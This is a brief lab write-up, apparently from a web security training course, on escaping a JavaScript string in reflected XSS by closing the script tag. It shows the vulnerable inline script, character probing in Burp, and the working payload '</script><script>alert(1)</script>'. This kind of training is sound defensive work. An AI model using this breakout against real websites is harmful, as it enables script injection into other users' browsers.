# Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

**End Goal:** Break out of the JavaScript string and call the `alert` function.

**Analysis**

- Open Burp --> Proxy tab --> Open Browser --> Access lab
- Search for `test` --> view source --> my input is reflected inside a JS string in an inline `<script>` block:

<script>
var searchTerms = 'test';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>

- In Repeater, probe the search term to see what's filtered:
  - `'` --> escaped to `\'` --> can't close the string
  - `\` --> escaped to `\\` --> can't cancel out their backslash escaping

*The usual string break-out (`'`) is dead, and so is the backslash trick. But the escaping only defends the JavaScript layer. The reflection lives inside an HTML `<script>` element, and the HTML parser runs first and doesn't care about JS string quoting. If I inject a literal `</script>`, the parser ends the script block right there, even though it's in the middle of a string. Angle brackets aren't encoded here, so this works.*

**Answer:**

</script><script>alert(1)</script>
